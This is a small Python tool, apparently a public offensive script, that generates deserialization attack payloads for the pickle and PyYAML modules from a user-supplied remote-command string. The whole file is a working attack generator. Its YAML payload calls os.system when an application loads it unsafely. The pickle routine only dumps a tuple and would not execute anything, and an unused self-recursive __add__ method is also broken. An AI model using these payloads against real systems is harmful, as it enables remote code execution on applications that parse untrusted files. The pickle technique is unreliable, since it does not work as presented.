# Python Deserialization attack payload file generator for pickle and yaml module by j0lt
# Requirements : Python 3
# Usage : python peas.py

import pickle
import os


class Payload(object):

    def __init__(self, cmd ,  location):
        self.cmd = cmd
        self.location = location

    def pick(self):
        pickle.dump((os.system, (self.cmd,)), open(self.location .__add__("_pick"), "wb"))

    def ya(self):
        open(self.location.__add__("_yaml"), "wb").write(bytes("!!python/object/apply:os.system ['{}']".format(self.cmd), "utf-8"))

    def __add__(self, other):

        return self+other


if __name__ == "__main__":
    cmd = input("Enter RCE command :")
    location = input("Enter File location and name to save :")
    p = Payload(cmd, location)
    while 1:
        module = input("Select Module (Pickle, PyYAML, All) :").lower()


        if module == "pickle":
            p.pick()
            break
        elif module == "pyyaml":
            p.ya()
            break
        elif module == "all":
            p.pick()
            p.ya()
            break
        else:
            print("Wrong Input ")
            continue

    print("done")
